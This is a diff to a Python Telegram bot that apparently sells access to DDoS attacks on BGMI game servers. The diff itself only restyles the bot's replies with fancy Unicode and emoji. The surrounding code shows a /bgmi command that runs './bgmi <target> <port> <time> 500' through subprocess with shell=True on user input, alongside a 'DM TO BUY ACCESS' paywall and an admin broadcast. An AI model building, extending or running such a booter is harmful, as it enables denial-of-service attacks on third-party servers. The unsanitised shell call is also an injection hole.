@@ -280,7 +280,7 @@ def start_attack_reply(message, target, port, time):
     user_info = message.from_user
     username = user_info.username if user_info.username else user_info.first_name
     
-    response = f"{username}, 𝐀𝐓𝐓𝐀𝐂𝐊 𝐒𝐓𝐀𝐑𝐓𝐄𝐃.🔥🔥\n\n𝐓𝐚𝐫𝐠𝐞𝐭: {target}\n𝐏𝐨𝐫𝐭: {port}\n𝐓𝐢𝐦𝐞: {time} 𝐒𝐞𝐜𝐨𝐧𝐝𝐬\n𝐌𝐞𝐭𝐡𝐨𝐝: VIP- @TanishDroid ka BLACK MAGIC✨"
+    response = f"{username},✅ 𝘼𝙩𝙩𝙖𝙘𝙠 𝙎𝙩𝙖𝙧𝙩𝙚𝙙.\n\n𝐓𝐚𝐫𝐠𝐞𝐭: {target}\n𝐏𝐨𝐫𝐭: {port}\n𝐓𝐢𝐦𝐞: {time} 𝐒𝐞𝐜𝐨𝐧𝐝𝐬\n𝐌𝐞𝐭𝐡𝐨𝐝: VIP- @TanishDroid ✨"
     bot.reply_to(message, response)
 
 # Dictionary to store the last time each user ran the /bgmi command
@@ -316,12 +316,12 @@ def handle_bgmi(message):
                 start_attack_reply(message, target, port, time)  # Call start_attack_reply function
                 full_command = f"./bgmi {target} {port} {time} 500"
                 process = subprocess.run(full_command, shell=True)
-                response = f"BGMI Attack Finished. Target: {target} Port: {port} Time: {time}"
+                response = f"🔅 𝘽𝙂𝙈𝙄 𝘼𝙩𝙩𝙖𝙘𝙠 𝙁𝙞𝙣𝙞𝙨𝙝𝙚𝙙. Target: {target} Port: {port} Time: {time}"
                 bot.reply_to(message, response)  # Notify the user that the attack is finished
         else:
-            response = "✅ Usage :- /bgmi <target> <port> <time>"  # Updated command syntax
+            response = "✅ 𝙐𝙨𝙖𝙜𝙚:- /bgmi <𝙩𝙖𝙧𝙜𝙚𝙩> <𝙥𝙤𝙧𝙩> <𝙩𝙞𝙢𝙚>"  # Updated command syntax
     else:
-        response = ("🚫 Unauthorized Access! 🚫\n\nOops! It seems like you don't have permission to use the /bgmi command. DM TO BUY ACCESS:- @TanishDroid")
+        response = ("🚫 𝙐𝙣𝙖𝙪𝙩𝙝𝙤𝙧𝙞𝙯𝙚𝙙 𝘼𝙘𝙘𝙚𝙨𝙨! 🚫\n\nOops! It seems like you don't have permission to use the /bgmi command. DM TO BUY ACCESS:- @TanishDroid")
 
     bot.reply_to(message, response)
 
@@ -342,7 +342,7 @@ def show_command_logs(message):
         except FileNotFoundError:
             response = "No command logs found."
     else:
-        response = "You Are Not Authorized To Use This Command 😡."
+        response = "🚫 𝙐𝙣𝙖𝙪𝙩𝙝𝙤𝙧𝙞𝙯𝙚𝙙 𝘼𝙘𝙘𝙚𝙨𝙨! 🚫/n/Only Admin can use this Command."
 
     bot.reply_to(message, response)
 
@@ -429,7 +429,7 @@ def broadcast_message(message):
     if user_id in admin_id:
         command = message.text.split(maxsplit=1)
         if len(command) > 1:
-            message_to_broadcast = "⚠️ Message To All Users By Admin:\n\n" + command[1]
+            message_to_broadcast = "⚠️ 𝙈𝙚𝙨𝙨𝙖𝙜𝙚 𝙏𝙤 𝘼𝙡𝙡 𝙐𝙨𝙚𝙧𝙨 𝘽𝙮 𝘼𝙙𝙢𝙞𝙣:\n\n" + command[1]
             with open(USER_FILE, "r") as file:
                 user_ids = file.read().splitlines()
                 for user_id in user_ids:
@@ -441,7 +441,7 @@ def broadcast_message(message):
         else:
             response = "🤖 Please Provide A Message To Broadcast."
     else:
-        response = "Only Admin Can Run This Command 😡."
+        response = "🚫 𝙐𝙣𝙖𝙪𝙩𝙝𝙤𝙧𝙞𝙯𝙚𝙙 𝘼𝙘𝙘𝙚𝙨𝙨! 🚫/n/Only Admin can use this Command."
 
     bot.reply_to(message, response)
 
